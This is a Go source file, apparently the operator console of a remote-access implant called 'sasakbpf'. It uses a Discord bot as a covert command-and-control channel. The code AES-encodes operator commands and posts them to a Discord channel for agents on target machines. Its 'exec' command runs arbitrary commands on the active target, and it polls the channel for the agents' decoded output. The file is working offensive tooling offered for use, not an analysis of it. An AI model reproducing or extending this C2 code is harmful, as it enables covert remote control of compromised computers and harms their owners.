package repl

import (
	"bufio"
	"context"
	"fmt"
	"os"
	"strings"
	"sync"

	"github.com/bwmarrin/discordgo"
	"github.com/chzyer/readline"

	"sasakbpf/internal/config"
	"sasakbpf/internal/protocol"
)

// Loop is the operator CLI REPL. It opens a REST-only discordgo Session
// (no gateway), posts sd1-encoded commands to the configured command
// channel, polls every 500ms for new messages, and prints decoded agent
// output to stdout. UI is intentionally minimal: ASCII banner, lines in
// "[*] ..."/"[+] ..."/"[!] ..."/"[x] ..." format, and a prompt of the
// form "[channelID] targetID > ".
func Loop(ctx context.Context, cfg config.Config) error {
	if err := validateConfig(&cfg); err != nil {
		return err
	}

	token := strings.TrimPrefix(cfg.BotToken, "Bot ")
	dg, err := discordgo.New("Bot " + token)
	if err != nil {
		return fmt.Errorf("discord: %w", err)
	}
	// REST-only — no gateway WSS.

	cursor, err := initCursor(dg, cfg.ChannelID)
	if err != nil {
		return fmt.Errorf("init cursor: %w", err)
	}

	sess := NewSession()
	var mu sync.Mutex
	lastID := cursor

	go pollLoop(ctx, dg, cfg, sess, &mu, &lastID)

	Banner(cfg.ChannelID, cfg.TargetID)

	if !runningInTTY() {
		// Non-TTY: stdin/stdout is a pipe (script, CI). Use vanilla bufio
		// reader — no ANSI codes, no readline, no tab-completion.
		return vanillaLoop(ctx, dg, cfg, sess, &mu, &lastID)
	}

	rl, err := buildReadline(cfg)
	if err != nil {
		return vanillaLoop(ctx, dg, cfg, sess, &mu, &lastID)
	}
	defer rl.Close()

	// Seed readline history from our persistent file (~/.config/sd-cli/history).
	prevHistory, _ := LoadHistory()
	for _, h := range prevHistory {
		if h != "" {
			_ = rl.SaveHistory(h)
		}
	}

	var lines []string
	for {
		rl.SetPrompt(Prompt(cfg.ChannelID, cfg.TargetID))
		line, err := rl.Readline()
		if err != nil { // io.EOF on Ctrl-D
			break
		}
		line = strings.TrimSpace(line)
		if line == "" {
			continue
		}
		lines = append(lines, line)

		if !handleCommand(ctx, dg, cfg, sess, line) {
			break
		}
	}

	_ = SaveHistory(append(prevHistory, lines...))
	fmt.Println()
	return nil
}

func buildReadline(cfg config.Config) (*readline.Instance, error) {
	return readline.NewEx(&readline.Config{
		Prompt:            Prompt(cfg.ChannelID, cfg.TargetID),
		HistoryFile:       historyPathMust(),
		HistorySearchFold: true,
		AutoComplete:      completer{cfg: &cfg},
		InterruptPrompt:   "^C",
		EOFPrompt:         "exit",
	})
}

func historyPathMust() string {
	p, err := historyPath()
	if err != nil {
		return ""
	}
	return p
}

// validateConfig catches operator misconfigurations early with a clear error
// message rather than a confusing crypto failure mid-session.
func validateConfig(cfg *config.Config) error {
	if cfg.BotToken == "" {
		return fmt.Errorf("missing SD_BOT_TOKEN (set env or rebuild with ldflags)")
	}
	if cfg.ChannelID == "" {
		return fmt.Errorf("missing SD_CHANNEL_ID")
	}
	if cfg.AESKeyHex == "" {
		return fmt.Errorf("missing SD_AES_KEY_HEX")
	}
	if len(cfg.AESKeyHex) != 64 || !isHex(cfg.AESKeyHex) {
		return fmt.Errorf("SD_AES_KEY_HEX must be 32 bytes (64 hex chars), got %d", len(cfg.AESKeyHex))
	}
	if cfg.TargetID == "" {
		cfg.TargetID = "*"
	}
	if cfg.Self == "" {
		cfg.Self = "cli"
	}
	return nil
}

func isHex(s string) bool {
	for _, r := range s {
		if !((r >= '0' && r <= '9') || (r >= 'a' && r <= 'f') || (r >= 'A' && r <= 'F')) {
			return false
		}
	}
	return true
}

// handleCommand dispatches a single REPL line. Returns false to signal the
// main loop should exit (used by /quit, /exit, /die). Commands use the same
// prefix set as before ('/exec', '/target' ... ) but a short bare form is
// also accepted ('help', 'agents', 'quit' — no leading slash needed).
func handleCommand(ctx context.Context, dg *discordgo.Session, cfg config.Config, sess *Session, line string) bool {
	// Normalise: accept both 'help' and '/help'.
	if strings.HasPrefix(line, "/") {
		line = strings.TrimPrefix(line, "/")
	}
	parts := strings.SplitN(line, " ", 2)
	cmd := parts[0]
	arg := ""
	if len(parts) == 2 {
		arg = strings.TrimSpace(parts[1])
	}

	switch cmd {
	case "quit", "exit":
		return false

	case "help":
		fmt.Println("Available commands:")
		fmt.Println("  help                  show this help")
		fmt.Println("  exec <cmd>            run command on active target")
		fmt.Println("  clear                 clear screen")
		fmt.Println("  history [N]           show recent CLI input history")
		fmt.Println("  quit                  exit CLI")

	case "exec":
		if arg == "" {
			Log("!", "usage: exec <cmd>")
			return true
		}
		out, err := protocol.Encode(protocol.PrefixCmd, cfg.TargetID, cfg.AESKeyHex, []byte(arg))
		if err != nil {
			Log("x", "encode: "+err.Error())
			return true
		}
		if _, err := dg.ChannelMessageSend(cfg.ChannelID, out); err != nil {
			Log("x", "send: "+err.Error())
			return true
		}
		sess.IncCmd(cfg.TargetID)

	case "clear":
		fmt.Print("\x1b[2J\x1b[H")

	case "history":
		n := 10
		if arg != "" {
			if x, e := parseIntStrict(arg); e == nil && x > 0 {
				n = x
			}
		}
		h, _ := LoadHistory()
		if len(h) > n {
			h = h[len(h)-n:]
		}
		for _, l := range h {
			fmt.Println(theme.Mute.Sprint("  " + l))
		}

	case "watch":
		Log("!", "watch mode not implemented in this build (planned for Fase 8)")

	default:
		Log("?", "unknown command: "+fmt.Sprintf("%q (try 'help')", line))
	}
	return true
}

func parseIntStrict(s string) (int, error) {
	n := 0
	for _, r := range s {
		if r < '0' || r > '9' {
			return 0, fmt.Errorf("not int")
		}
		n = n*10 + int(r-'0')
		if n > 1_000_000 {
			return 0, fmt.Errorf("too large")
		}
	}
	return n, nil
}

// completer provides tab completion for command names and the active
// targetID after 'target', 'ping', 'exec', 'die'.
type completer struct{ cfg *config.Config }

func (c completer) Do(line []rune, pos int) (newLine [][]rune, length int) {
	if pos == 0 || line[0] == ' ' {
		return nil, 0
	}
	prefix := string(line[:pos])
	stripSlash := strings.TrimPrefix(prefix, "/")
	if !strings.HasPrefix(prefix, "/") && !strings.ContainsAny(prefix, " /") {
		// bare word completion too
		stripSlash = prefix
	}
	parts := strings.Fields(stripSlash)
	if len(parts) == 0 {
		return nil, 0
	}
	cmds := []string{"exec", "help", "quit", "exit", "clear", "history"}
	if len(parts) == 1 {
		var out [][]rune
		for _, c := range cmds {
			if strings.HasPrefix(c, parts[0]) {
				out = append(out, []rune(strings.TrimPrefix(c, parts[0])))
			}
		}
		if len(out) > 0 {
			return out, len(parts[0])
		}
		return nil, 0
	}
	return nil, 0
}

// vanillaLoop is the non-TTY fallback when readline is unavailable. Uses
// bufio.Reader for full-line input (not Fscanln which tokenises on
// whitespace) so the CLI still works in scripts/pipes without readline.
func vanillaLoop(ctx context.Context, dg *discordgo.Session, cfg config.Config, sess *Session, mu *sync.Mutex, lastID *string) error {
	r := bufio.NewReader(os.Stdin)
	for {
		select {
		case <-ctx.Done():
			return nil
		default:
		}
		fmt.Print(Prompt(cfg.ChannelID, cfg.TargetID))
		line, err := r.ReadString('\n')
		if err != nil {
			return nil
		}
		line = strings.TrimSpace(line)
		if line == "" {
			continue
		}
		if !handleCommand(ctx, dg, cfg, sess, line) {
			return nil
		}
	}
}
